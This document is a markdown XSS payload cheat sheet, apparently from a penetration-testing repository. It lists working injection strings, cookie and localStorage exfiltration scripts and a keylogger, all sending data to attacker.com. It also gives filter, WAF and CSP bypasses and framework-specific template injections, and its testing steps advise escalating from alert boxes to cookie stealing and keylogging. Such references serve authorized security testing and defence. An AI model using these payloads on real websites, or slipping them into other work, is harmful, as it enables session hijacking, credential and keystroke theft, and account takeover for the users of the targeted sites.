# Cross-Site Scripting (XSS) Payloads

## Overview

Cross-Site Scripting (XSS) is a security vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users.

## Types of XSS

### 1. **Reflected XSS**
The malicious script is embedded in a link and executed when the victim clicks it.

**Example:**
```
http://vulnerable-site.com/search?q=<script>alert('XSS')</script>
```

### 2. **Stored XSS**
The malicious script is stored on the server (database, comment field, etc.) and executed every time the page is accessed.

**Example:**
```html
Comment: <script>fetch('http://attacker.com?cookie='+document.cookie)</script>
```

### 3. **DOM-Based XSS**
The vulnerability exists in client-side code, where the DOM is modified with unsanitized data.

**Example:**
```javascript
// Vulnerable code
document.write(location.hash.substring(1));

// Attack
http://site.com/#<img src=x onerror=alert(1)>
```

## Payload Categories

### Basic Alert Payloads
```html
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
```

### Data Exfiltration
```javascript
// Cookie stealing
<script>new Image().src="http://attacker.com/?c="+document.cookie</script>

// Local storage exfiltration
<script>
fetch('http://attacker.com', {
  method: 'POST',
  body: JSON.stringify({
    cookies: document.cookie,
    localStorage: localStorage,
    sessionStorage: sessionStorage
  })
});
</script>
```

### Keylogger
```html
<img src=x onerror='document.onkeypress=function(e){
  fetch("http://attacker.com/?k="+String.fromCharCode(e.which))
},this.remove();'>
```

## Bypass Techniques

### Filter Bypass - Case Manipulation
```html
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x ONERROR=alert(1)>
```

### Filter Bypass - Encoding
```html
<!-- HTML Entity -->
<img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;(1)">

<!-- Unicode -->
<img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)">

<!-- Hex -->
<img src=x onerror="\x61\x6c\x65\x72\x74(1)">
```

### Filter Bypass - Tag Breaking
```html
<scri<script>pt>alert(1)</scri</script>pt>
<img src=x one<script>rror=alert(1)>
```

### Filter Bypass - Comment Injection
```html
<!--><script>alert(1)</script>-->
<script><!--
alert(1)
//--></script>
```

## WAF Bypass Techniques

### Cloudflare
```html
<svg/onload=location=/java/.source+/script/.source+/:/.source+alert/.source+/(1)/.source;>
```

### AWS WAF
```html
<details/open/ontoggle=alert`1`>
```

### ModSecurity
```html
<img src=x onerror=\u0061\u006C\u0065\u0072\u0074(1)>
```

## CSP Bypass

### JSONP Endpoint Abuse
```html
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>
```

### Base-URI Bypass
```html
<base href="http://attacker.com/">
<script src="/xss.js"></script>
```

## Framework-Specific XSS

### AngularJS (< 1.6)
```javascript
{{constructor.constructor('alert(1)')()}}
{{$eval.constructor('alert(1)')()}}
```

### Angular (1.6+)
```javascript
{{[].pop.constructor&#40'alert\u00281\u0029'&#41&#40&#41}}
```

### React
```jsx
// Dangerous dangerouslySetInnerHTML
<div dangerouslySetInnerHTML={{__html: userInput}} />

// href javascript:
<a href="javascript:alert(1)">Click</a>
```

## Testing Methodology

1. **Identify Input Points**: Form fields, URL parameters, HTTP headers
2. **Test for Reflection**: Submit test strings and observe where they appear
3. **Test Basic Payloads**: Try simple payloads like `<script>alert(1)</script>`
4. **Bypass Filters**: Use encoding, case manipulation, tag breaking
5. **Test Different Contexts**: HTML, JavaScript, CSS, URL, attribute
6. **Escalate**: Move from alert() to cookie stealing, keylogging, etc.

## Useful Payloads by Context

### In HTML Context
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

### In JavaScript Context
```javascript
'-alert(1)-'
';alert(1);//
```

### In Attribute Context
```html
" onload="alert(1)
" autofocus onfocus="alert(1)
```

### In URL Context
```
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

## Tools

- **XSStrike**: Advanced XSS detection suite
- **Dalfox**: Fast XSS scanner
- **XSpear**: Ruby-based XSS scanner
- **Burp Suite**: Manual and automated testing
- **OWASP ZAP**: Security testing tool

## References

- [OWASP XSS Guide](https://owasp.org/www-community/attacks/xss/)
- [PortSwigger XSS](https://portswigger.net/web-security/cross-site-scripting)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)

---

**See `payloads.txt` for comprehensive payload list**
